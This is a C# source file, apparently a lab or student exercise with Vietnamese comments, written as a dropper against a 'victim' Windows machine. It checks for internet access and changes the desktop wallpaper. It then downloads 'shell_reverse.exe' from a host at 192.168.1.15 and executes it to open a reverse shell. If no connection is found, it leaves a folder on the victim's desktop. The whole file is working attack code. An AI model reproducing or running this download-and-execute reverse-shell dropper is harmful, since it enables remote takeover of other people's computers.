using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace ConnectBack
{
    public class Program
    {

        public static void Main(string[] args)
        {
            if (CheckForInternetConnection() == true)
            {
                DisplayPicture();
                ReverseShell();
            }
            else
            {
                CreateFolderOnDesktop();
            }


        }
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;

        // Thay đổi hình nền Desktop
        private static void DisplayPicture()
        {
            var image = "picture1.jpg";
            using (var client = new WebClient())
            {
                client.DownloadFile("https://unsplash.com/photos/UZ3V6AV5y4o/download?force=true&w=2400", image);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + image;
            uint flags = 0;
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0, filepath, flags))
            {
                Console.WriteLine("Error");
            }
        }
        // Kiểm tra kết nối internet
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        // Thực thi reverse shell
        public static void ReverseShell()
        {
            var reverse_shell = "reverse_shell.exe";
            using (var client = new WebClient())
            {
                client.DownloadFile("http://192.168.1.15/shell_reverse.exe", reverse_shell);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + reverse_shell;
            Process.Start(filepath);
        }
        // Tạo folder trên desktop victim
        public static void CreateFolderOnDesktop()
        {
            string newFolder = "thanhhuy";

            string path = Path.Combine(
               Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
               newFolder
            );
            Directory.CreateDirectory(path);
        }

    }
}